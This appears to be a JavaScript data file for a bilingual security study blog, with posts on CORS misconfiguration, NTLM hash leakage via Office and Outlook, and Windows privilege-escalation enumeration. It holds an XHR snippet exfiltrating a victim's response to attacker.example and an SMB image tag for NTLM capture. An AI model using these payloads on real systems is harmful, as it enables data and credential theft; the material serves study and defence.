<pre><code>https://example.com:443
协议 = https
域名 = example.com
端口 = 443</code></pre>
<p>SOP 的目标是阻止一个站点上的 JavaScript 读取另一个站点的敏感响应。例如恶意站点可以尝试请求你的邮箱或内网站点，但正常情况下无法读取返回内容。</p>
<blockquote>SOP 保护的是“读取响应”的能力；请求本身仍可能发出，这也是 CSRF 能成立的原因。</blockquote>
<hr />
<h3>CORS 是什么</h3>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415055130.png" alt="跨域 API 请求被浏览器拦截" />
<p><strong>CORS（Cross-Origin Resource Sharing）</strong> 是同源策略的例外机制。服务器通过响应头告诉浏览器：哪些 Origin 可以读取响应、可以使用哪些方法、是否允许凭证、是否允许自定义请求头。</p>
<ul>
  <li><code>Access-Control-Allow-Origin</code>：允许哪个源读取响应。</li>
  <li><code>Access-Control-Allow-Credentials</code>：是否允许携带 Cookie / Authorization 并暴露响应。</li>
  <li><code>Access-Control-Allow-Methods</code>：预检后允许哪些 HTTP 方法。</li>
  <li><code>Access-Control-Allow-Headers</code>：预检后允许哪些请求头。</li>
  <li><code>Access-Control-Expose-Headers</code>：允许前端额外读取哪些响应头。</li>
  <li><code>Access-Control-Max-Age</code>：预检结果缓存多久。</li>
</ul>
<h4>预检请求</h4>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415064528.png" alt="CORS 预检请求" />
<p>当请求不是简单请求时，浏览器会先发送 <code>OPTIONS</code> 预检请求，询问服务端是否允许后续跨域请求。</p>
<pre><code>Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type</code></pre>
<p>服务端如果允许，会返回对应的 <code>Access-Control-Allow-*</code> 头，浏览器才继续发送真实请求。</p>
<hr />
<h3>CORS 错误配置</h3>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415190236.png" alt="任意 Origin 反射示例" />
<h4>任意 Origin 反射</h4>
<p>服务端直接把请求中的 <code>Origin</code> 原样反射到 <code>Access-Control-Allow-Origin</code>，并同时允许凭证：</p>
<pre><code>Origin: https://evil.example

Access-Control-Allow-Origin: https://evil.example
Access-Control-Allow-Credentials: true</code></pre>
<p>这会让恶意站点在受害者登录态下读取目标站点响应。</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://target.example/data.php', true);
xhr.withCredentials = true;
xhr.onload = () =&gt; {
  var exfil = new XMLHttpRequest();
  exfil.open('POST', 'https://attacker.example/log', true);
  exfil.setRequestHeader('Content-Type', 'application/json');
  exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<h4>不当白名单匹配</h4>
<p>如果后端只用字符串前缀或后缀判断可信来源，攻击者可能构造相似域名绕过，例如把 <code>attackercors-misconfigs.htb</code> 错误识别成可信子域。</p>
<h4>信任 null Origin</h4>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415174331.png" alt="null Origin 请求示例" />
<p>某些场景下沙盒 iframe 或 data URL 会产生 <code>Origin: null</code>。如果服务端信任 <code>null</code>，攻击者可以借此读取响应。</p>
<pre><code class="language-html">&lt;iframe sandbox="allow-scripts allow-forms" src="data:text/html,&lt;script&gt;/* payload */&lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
<h4>针对内网 API</h4>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415180612.png" alt="通过浏览器访问内网 API" />
<p>即使没有凭证，如果内部 API 不需要认证并配置了 <code>Access-Control-Allow-Origin: *</code>，攻击者也可能借受害者浏览器访问内网资源并读取数据。</p>
<hr />
<h3>通过 CORS 绕过 CSRF Token</h3>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415185929.png" alt="SameSite None 与 CORS 头" />
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415190439.png" alt="带 CSRF Token 的状态修改请求" />
<p>传统 CSRF Token 的作用是要求攻击者无法猜到动态令牌。但如果 CORS 错误配置允许攻击者读取响应，攻击者就可以：</p>
<ol>
  <li>诱导受害者访问恶意页面。</li>
  <li>用受害者 Cookie 请求目标页面。</li>
  <li>从响应中读取 CSRF Token。</li>
  <li>把 Token 放入状态修改请求。</li>
  <li>完成原本受 CSRF Token 保护的操作。</li>
</ol>
<blockquote>普通 CSRF 往往只能“发请求”；CORS 错误配置可能让攻击者“读响应”，这会让动态 Token 防护失效。</blockquote>
<hr />
<h3>防护要点</h3>
<ul>
  <li>不要反射任意 Origin。</li>
  <li>不要把 <code>*</code> 与凭证请求混用。</li>
  <li>使用严格 Origin 白名单，按完整协议、域名、端口匹配。</li>
  <li>避免信任 <code>null</code> Origin。</li>
  <li>敏感接口同时使用 SameSite、CSRF Token、服务端授权校验。</li>
  <li>XSS 一旦存在，CSRF 防护、Token 和前端权限边界都可能被进一步绕过。</li>
</ul>`
    }
  },
  {
    id: "ntlm-credential-leakage",
    href: "posts/ad/ntlm-credential-leakage.html",
    title: {
      en: "NTLM Credential Leakage and Privilege Escalation Paths",
      zh: "NTLM 凭据泄露与提权路径"
    },
    category: "ad",
    categoryLabel: { en: "Active Directory", zh: "活动目录" },
    description: {
      en: "A study note on NTLM leakage through Office, Outlook, Access, media playlists, and Publisher remote resource loading.",
      zh: "梳理 Office、Outlook、Access、媒体播放列表和 Publisher 远程资源加载导致 NTLM 泄露的常见路径。"
    },
    date: "2026-05-07",
    content: {
      en: "NTLM remains a fallback authentication mechanism, and attackers abuse remote resource loading to capture hashes.",
      zh: "NTLM 仍是 Windows 生态中的后备认证机制，攻击者可借远程资源加载捕获哈希。"
    },
    code: "remote resource -> SMB authentication -> NTLM hash capture -> relay / pass-the-hash / cracking",
    contentHtml: {
      en: String.raw`<p>NTLM is old, but it remains deeply embedded in Windows environments as a compatibility fallback. Attackers often do not need the cleartext password. A captured NTLM hash may be cracked offline, relayed, or reused in pass-the-hash scenarios depending on the environment.</p>
<hr />
<h3>Attack Chain</h3>
<pre><code>user opens or previews content
-> application loads a remote resource
-> Windows attempts SMB/NTLM authentication
-> attacker captures NetNTLM material
-> attacker cracks, relays, or reuses credentials</code></pre>
<hr />
<h3>Common Leakage Vectors</h3>
<img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063448.png" alt="Word protected view for malicious RTF document" />
<img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063704.png" alt="Outlook remote image HTML example" />
<ul>
  <li><strong>Word RTF OLE links:</strong> external linked objects may trigger remote file checks and SMB authentication.</li>
  <li><strong>Outlook remote images:</strong> trusted senders or unsafe handling can cause automatic resource loading.</li>
  <li><strong>Access remote tables:</strong> database objects or AutoExec flows can query remote tables before the user enables active content.</li>
  <li><strong>Windows Media Player playlists:</strong> legacy playlist extensions such as <code>.wax</code>, <code>.wvx</code>, and <code>.wmx</code> can point to SMB-hosted media.</li>
  <li><strong>Publisher mail merge:</strong> remote recipient lists may be checked before the user approves external data access.</li>
</ul>
<hr />
<h3>Why It Matters</h3>
<p>If the leaked material belongs to a privileged user, impact can extend beyond the initial workstation. Attackers may perform relay attacks, authenticate to exposed services, attempt pass-the-hash, access remote admin protocols, or chain into domain-level attacks such as DCSync when privileges allow.</p>
<hr />
<h3>Defensive Notes</h3>
<ul>
  <li>Restrict outbound SMB to the Internet.</li>
  <li>Enforce SMB signing where appropriate.</li>
  <li>Reduce or disable NTLM where possible.</li>
  <li>Harden Outlook and Office external content behavior.</li>
  <li>Monitor unusual outbound 445/139 traffic and NetNTLM capture patterns.</li>
  <li>Train users that “denying content” prompts may not always stop earlier file existence checks.</li>
</ul>`,
      zh: String.raw`<p>NTLM 是 Windows 生态里一个历史很长的认证协议。虽然 Kerberos 更现代、更安全，但 NTLM 因为兼容性原因仍然大量存在。攻击者经常利用应用程序加载远程资源时的自动认证行为，诱导目标向攻击者控制的 SMB 服务发送 NTLM 认证信息。</p>
<blockquote>攻击者不一定需要明文密码；捕获到的 NTLM 相关材料可能用于离线破解、中继攻击或哈希传递。</blockquote>
<hr />
<h3>典型攻击链</h3>
<img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063448.png" alt="Word 受保护视图中的 RTF 文档" />
<pre><code>用户打开或预览文件 / 邮件
-> 应用尝试加载远程资源
-> Windows 回退到 SMB / NTLM 认证
-> 攻击者捕获 NetNTLM 信息
-> 离线破解 / Relay / Pass-the-Hash / 横向移动
-> 若凭据高权限，继续扩大到域内提权</code></pre>
<hr />
<h3>为什么 NTLM 泄露危险</h3>
<p>如果泄露的是普通用户，攻击者可能尝试破解密码、验证密码复用、访问文件共享或内部系统。如果泄露的是特权用户，影响会明显扩大：可以尝试远程管理协议认证、PsExec、WMI、RDP、请求票据，甚至在具备条件时执行 DCSync 等域内攻击。</p>
<hr />
<h3>常见泄露场景</h3>
<h4>1. Microsoft Word：恶意 RTF 自动链接</h4>
<img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063513.png" alt="Word 外部链接更新警告" />
<p>攻击者可以在 RTF 文档中嵌入 OLE 链接或远程资源引用。用户启用编辑后，Word 可能在处理链接对象时尝试检查远程文件是否存在。这个检查动作可能触发 SMB 连接，从而把 NTLM 认证信息发送给攻击者服务器。</p>
<p>风险点在于：某些情况下用户即使拒绝更新外部链接，应用在提示前或处理过程中已经发起过远程访问。</p>
<h4>2. Microsoft Outlook：远程图片标签</h4>
<img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063704.png" alt="Outlook 远程图片标签示例" />
<img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063755.png" alt="Outlook 触发远程资源加载" />
<p>HTML 邮件中的图片可以指向远程资源。如果资源使用 SMB 路径，或者邮件来自可信发件人导致图片自动加载，Outlook 可能在打开邮件时触发 NTLM 认证。</p>
<pre><code class="language-html">&lt;img src="\\\\attacker.example\\share\\image.png"&gt;</code></pre>
<p>当发件人是同事或已被攻陷的内部账号时，用户警惕性会降低，图片也更可能自动渲染，因此风险更高。</p>
<h4>3. Microsoft Access：远程表刷新</h4>
<img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411064108.png" alt="Access 活动内容被阻止提示" />
<img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411064154.png" alt="Access 打开数据库后的安全横幅" />
<p>Access 数据库可以引用远程表。攻击者构造包含 AutoExec 或查询对象的数据库文件后，应用可能在用户启用活动内容之前就检查远程表，从而触发 NTLM 泄露。</p>
<p>这类场景容易造成误判：用户看到“活动内容已被禁用”会以为安全，但远程资源检查可能已经发生。</p>
<h4>4. Windows Media Player：旧版播放列表文件</h4>
<img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411064236.png" alt="Windows Media Player 播放列表附件" />
<img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411064309.png" alt="Outlook 对播放列表扩展名过滤不一致" />
<p><code>.wax</code>、<code>.wvx</code>、<code>.wmx</code> 等旧版播放列表文件可以指向远程媒体流。如果用户双击附件，播放器会尝试从指定位置加载媒体，若位置是 SMB 资源，就可能触发 NTLM 认证。</p>
<p>一些安全过滤器会拦截常见危险扩展，但不一定覆盖所有等价播放列表格式，因此这种边界不一致会被利用。</p>
<h4>5. Microsoft Publisher：远程收件人列表</h4>
<p>Publisher 的邮件合并功能可以从远程数据源加载联系人列表。应用可能在用户允许或拒绝外部数据访问之前，先验证远程文件是否存在，这个验证动作足以触发 NTLM 认证。</p>
<hr />
<h3>检测与防护思路</h3>
<ul>
  <li>在出口防火墙限制到公网的 SMB/NetBIOS 流量，重点关注 445、139。</li>
  <li>尽可能减少或禁用 NTLM，优先使用 Kerberos。</li>
  <li>对 SMB Relay 场景启用 SMB Signing、LDAP Signing、EPA 等防护。</li>
  <li>强化 Office、Outlook 的外部内容加载策略。</li>
  <li>监控异常的外联 SMB、频繁的 NetNTLM 捕获特征和可疑文件类型。</li>
  <li>对受信任发件人模型保持谨慎，内部账号被攻陷后会显著提升诱导成功率。</li>
</ul>
<hr />
<h3>学习要点</h3>
<ul>
  <li>NTLM 泄露的关键不是“宏执行”，而是“远程资源加载触发认证”。</li>
  <li>提示框出现不代表之前没有网络访问。</li>
  <li>泄露材料的价值取决于账号权限、网络暴露面和防护配置。</li>
  <li>限制出站 SMB 是最直接、最有效的缓解措施之一。</li>
</ul>`
    }
  },
  {
    id: "windows-privilege-escalation",
    href: "posts/pentest/windows-privilege-escalation.html",
    title: {
      en: "Windows Privilege Escalation: Enumeration Methodology",
      zh: "Windows 权限提升：枚举方法论"
    },
    category: "pentest",
    categoryLabel: { en: "Penetration Testing", zh: "渗透测试" },
    description: {
      en: "A structured Windows local privilege escalation note covering goals, tools, situational awareness, system enumeration, users, groups, and services.",
      zh: "结构化整理 Windows 本地提权目标、工具、态势感知、系统信息、用户组与服务枚举方法。"
    },
    date: "2026-05-07",
    content: {
      en: "Windows privilege escalation is mostly disciplined enumeration before exploitation.",
      zh: "Windows 提权的核心通常不是立刻打洞，而是系统化枚举后找到最稳的路径。"
    },
    code: "whoami /priv && systeminfo && net localgroup administrators",
    contentHtml: {
      en: String.raw`<p>Windows privilege escalation aims to move from a limited foothold to a more useful security context such as local administrator, <code>NT AUTHORITY\\SYSTEM</code>, or another user whose access unlocks the next objective.</p>
<hr />
<h3>Why Escalate</h3>
<ul>
  <li>Access local resources such as databases, files, or service secrets.</li>
  <li>Dump or recover credentials for lateral movement.</li>
  <li>Gain SYSTEM on a domain-joined host and expand into Active Directory.</li>
  <li>Validate workstation or server build weaknesses.</li>
</ul>
<hr />
<h3>Useful Tools</h3>
<ul>
  <li><strong>Seatbelt / SharpUp:</strong> C# enumeration for host misconfigurations.</li>
  <li><strong>winPEAS:</strong> broad Windows privilege escalation checks.</li>
  <li><strong>PowerUp:</strong> PowerShell checks for common misconfigurations.</li>
  <li><strong>JAWS:</strong> PowerShell 2.0 friendly enumeration.</li>
  <li><strong>SessionGopher:</strong> saved session and remote access credential discovery.</li>
  <li><strong>LaZagne:</strong> local stored credential recovery.</li>
  <li><strong>WES-NG / Watson:</strong> missing patch and exploit suggestion workflows.</li>
  <li><strong>Sysinternals:</strong> AccessChk, PsService, PipeList, and other inspection utilities.</li>
</ul>
<hr />
<h3>Manual Enumeration Baseline</h3>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260228022956.png" alt="Windows privilege escalation lab connection example" />
<pre><code class="language-cmd">ipconfig /all
arp -a
route print
whoami /priv
whoami /groups
query user
net user
net localgroup
net localgroup administrators
net accounts
systeminfo
wmic qfe
tasklist /svc
netstat -ano</code></pre>
<hr />
<h3>What to Look For</h3>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322063450.png" alt="Windows enumeration command output example" />
<ul>
  <li>Unusual network routes or dual-homed hosts.</li>
  <li>Weak or absent endpoint protections.</li>
  <li>AppLocker policy gaps and writable allowed paths.</li>
  <li>Outdated OS builds and missing patches.</li>
  <li>Privileged services with weak file or registry permissions.</li>
  <li>Interesting local groups and reusable credentials.</li>
  <li>Services exposed only on localhost.</li>
  <li>Tokens such as <code>SeImpersonatePrivilege</code>.</li>
</ul>
<hr />
<h3>Process and Service Mindset</h3>
<p>Running processes show what the machine is used for. Web servers, database services, FTP services, backup agents, and management tools often become privilege escalation opportunities through misconfiguration, stored credentials, or service account privileges.</p>
<blockquote>Do not treat enumeration output as a checklist to finish. Treat it as clues about how the host is operated.</blockquote>`,
      zh: String.raw`<p>Windows 权限提升的目标，是把当前低权限访问提升到更有价值的安全上下文，例如本地管理员、<code>NT AUTHORITY\\SYSTEM</code>，或者某个可以继续横向移动的用户。真正稳定的提权往往不是一上来就跑漏洞，而是先通过枚举理解系统。</p>
<hr />
<h3>为什么需要提权</h3>
<ul>
  <li>获取本地敏感资源，例如数据库、配置文件、备份、凭据文件。</li>
  <li>获取凭据，用于横向移动或进一步域内提权。</li>
  <li>在加入域的机器上获得 SYSTEM 权限，从而接触更多 AD 攻击面。</li>
  <li>验证黄金镜像、工作站或服务器基线是否存在缺陷。</li>
</ul>
<hr />
<h3>常见提权方向</h3>
<ul>
  <li>滥用 Windows 组权限。</li>
  <li>滥用 Windows 用户权限，例如 <code>SeImpersonatePrivilege</code>。</li>
  <li>绕过 UAC。</li>
  <li>滥用弱服务权限、弱文件权限或可写服务路径。</li>
  <li>利用缺失补丁对应的内核或本地提权漏洞。</li>
  <li>凭据窃取、哈希复用、配置文件敏感信息。</li>
  <li>流量捕获与认证协议滥用。</li>
</ul>
<hr />
<h3>工具清单</h3>
<ul>
  <li><strong>Seatbelt：</strong>C# 本地枚举工具，用于快速收集主机安全配置。</li>
  <li><strong>winPEAS：</strong>覆盖面很广的 Windows 提权路径检查脚本。</li>
  <li><strong>PowerUp / SharpUp：</strong>查找基于错误配置的常见提权向量。</li>
  <li><strong>JAWS：</strong>PowerShell 2.0 兼容的枚举脚本。</li>
  <li><strong>SessionGopher：</strong>查找 PuTTY、WinSCP、RDP 等保存的会话信息。</li>
  <li><strong>LaZagne：</strong>提取本机存储密码和应用凭据。</li>
  <li><strong>WES-NG / Watson：</strong>根据系统补丁信息推测可利用漏洞。</li>
  <li><strong>Sysinternals：</strong>AccessChk、PsService、PipeList 等用于权限和服务检查。</li>
</ul>
<blockquote>工具能加速，但不能替代理解。无网络、无 USB、强限制环境中，手工枚举能力非常关键。</blockquote>
<hr />
<h3>态势感知：先知道自己在哪</h3>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260228022956.png" alt="Windows 提权实验连接示例" />
<p>刚拿到 Windows 主机访问时，先确认网络、域、用户、保护措施和系统用途。</p>
<h4>网络信息</h4>
<pre><code class="language-cmd">ipconfig /all
arp -a
route print</code></pre>
<ul>
  <li><code>ipconfig /all</code>：查看网卡、DNS、域信息、是否双网卡。</li>
  <li><code>arp -a</code>：查看近期通信主机，辅助判断横向移动目标。</li>
  <li><code>route print</code>：查看路由表，确认是否能通向其他网段。</li>
</ul>
<h4>保护措施</h4>
<pre><code class="language-powershell">Get-MpComputerStatus
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -Path C:\Windows\System32\cmd.exe -User Everyone</code></pre>
<p>需要关注 Defender 状态、脚本执行限制、AppLocker 允许路径，以及是否存在用户可写且被允许执行的位置。</p>
<hr />
<h3>系统信息枚举</h3>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322063450.png" alt="系统信息枚举输出示例" />
<h4>系统版本与补丁</h4>
<pre><code class="language-cmd">systeminfo
wmic qfe</code></pre>
<pre><code class="language-powershell">Get-HotFix | ft -AutoSize</code></pre>
<p>重点看 OS 版本、Build、安装时间、启动时间、Hotfix。长时间未重启、补丁缺失或旧版本系统，都可能存在公开 LPE 路径。</p>
<h4>进程与服务</h4>
<pre><code class="language-cmd">tasklist /svc
netstat -ano
netstat -ano | findstr :8080
tasklist /svc | findstr 2400</code></pre>
<p>通过进程和监听端口判断主机角色。Web 服务、数据库、FTP、备份代理、远程管理工具都可能带来凭据、服务权限或本地接口攻击面。</p>
<h4>环境变量</h4>
<pre><code class="language-cmd">set</code></pre>
<p>关注 <code>PATH</code>、<code>USERPROFILE</code>、<code>HOMEDRIVE</code>、<code>APPDATA</code>。如果 PATH 中存在用户可写目录，可能引出 DLL 劫持或路径劫持；如果 HOMEDRIVE 指向共享，可能发现敏感文件。</p>
<hr />
<h3>用户与组枚举</h3>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322063901.png" alt="用户与组枚举输出示例" />
<h4>当前用户与权限</h4>
<pre><code class="language-cmd">echo %USERNAME%
whoami /priv
whoami /groups</code></pre>
<p><code>whoami /priv</code> 非常关键。看到 <code>SeImpersonatePrivilege</code>、<code>SeBackupPrivilege</code>、<code>SeDebugPrivilege</code> 等权限时，应进一步判断是否可利用。</p>
<h4>登录用户</h4>
<pre><code class="language-cmd">query user</code></pre>
<p>已登录用户可能带来进程、令牌、文件或会话机会。实战中还要注意避免影响真实用户操作。</p>
<h4>本地用户、组和密码策略</h4>
<pre><code class="language-cmd">net user
net localgroup
net localgroup administrators
net accounts</code></pre>
<ul>
  <li>查看本地管理员组成员，寻找非标准账号。</li>
  <li>检查 Remote Desktop Users、Remote Management Users 等远程访问组。</li>
  <li>结合密码策略判断喷洒、复用和弱口令风险。</li>
</ul>
<hr />
<h3>与进程和服务交互</h3>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322064024.png" alt="服务与端口枚举输出示例" />
<p>很多本地提权来自正在运行的服务：服务以高权限运行，但其二进制文件、配置文件、注册表项或目录权限可被低权限用户修改。另一个常见路径是 Web 服务或数据库服务账户拥有可滥用权限，例如 <code>SeImpersonatePrivilege</code>。</p>
<pre><code>发现服务 -> 确认运行用户 -> 检查文件/目录/注册表权限 -> 判断能否替换或劫持 -> 重启或触发服务 -> 获得高权限执行</code></pre>
<hr />
<h3>实战枚举顺序建议</h3>
<ol>
  <li>确认当前用户、权限和组。</li>
  <li>收集系统版本、补丁和防护状态。</li>
  <li>查看网络配置、路由、ARP 和域信息。</li>
  <li>枚举进程、服务、监听端口。</li>
  <li>检查本地用户、管理员组、远程访问组。</li>
  <li>查找已安装软件、配置文件、凭据和共享目录。</li>
  <li>再决定使用工具验证，而不是盲目跑所有脚本。</li>
</ol>
<blockquote>Windows 提权的关键不是命令背得多，而是能把枚举结果串成一条可信路径。</blockquote>`
    }
  }
];
